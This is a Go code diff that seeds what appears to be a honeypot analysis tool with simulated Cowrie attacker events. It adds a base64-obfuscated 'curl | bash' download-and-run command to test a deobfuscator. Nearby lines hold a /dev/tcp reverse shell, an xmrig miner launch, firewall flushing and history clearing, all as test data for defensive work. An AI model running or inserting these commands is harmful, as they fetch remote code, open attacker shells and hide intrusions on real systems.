@@ -46,6 +46,10 @@ func main() {
 		mk(-45*time.Minute-time.Second, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "crontab -l", "S1", "cowrie:hassh-aaa"),
 		mk(-44*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "./xmrig --pool stratum+tcp://pool.io:3333", "S1", "cowrie:hassh-aaa"),
 		mk(-43*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "history -c", "S1", "cowrie:hassh-aaa"),
+		// Obfuscated demo command - exercises Slice K deobfuscator
+		// base64("curl http://1.2.3.4/m | bash") = "Y3VybCBodHRwOi8vMS4yLjMuNC9tIHwgYmFzaA=="
+		mk(-42*time.Minute-30*time.Second, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root",
+			`echo "Y3VybCBodHRwOi8vMS4yLjMuNC9tIHwgYmFzaA==" | base64 -d | bash`, "S1", "cowrie:hassh-aaa"),
 		mk(-42*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "iptables -F", "S1", "cowrie:hassh-aaa"),
 		mk(-41*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "S1", "cowrie:hassh-aaa"),
 		mk(-40*time.Minute, models.SourceCowrie, models.KindCommand, "45.67.89.10", "root", "netstat -tunlp", "S1", "cowrie:hassh-aaa"),
